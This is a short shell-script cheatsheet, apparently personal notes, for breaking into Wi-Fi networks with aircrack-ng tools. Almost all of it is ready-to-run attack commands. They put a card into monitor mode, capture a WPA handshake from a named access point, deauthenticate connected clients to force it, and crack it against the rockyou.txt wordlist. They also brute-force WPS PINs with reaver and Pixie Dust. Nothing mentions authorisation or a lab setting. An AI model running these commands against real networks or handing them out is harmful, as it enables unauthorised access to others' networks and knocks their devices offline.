#!/bin/sh
##-=========================================-##
##   [+] Xe1phix-[Airmon-ng]-Cheatsheet.sh
##-=========================================-##




airmon-ng start wlan0				## put your network device into monitor mode

listen for all nearby beacon frames to get target BSSID and channel

airodump-ng mon0


airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0

aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt $File.cap

aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0


# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/$File.cap




Reaver
------

airmon-ng start wlan0
airodump-ng wlan0
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1


Pixie WPS
---------

airmon-ng check
airmon-ng start wlan0
airodump-ng mon0 --wps
reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1



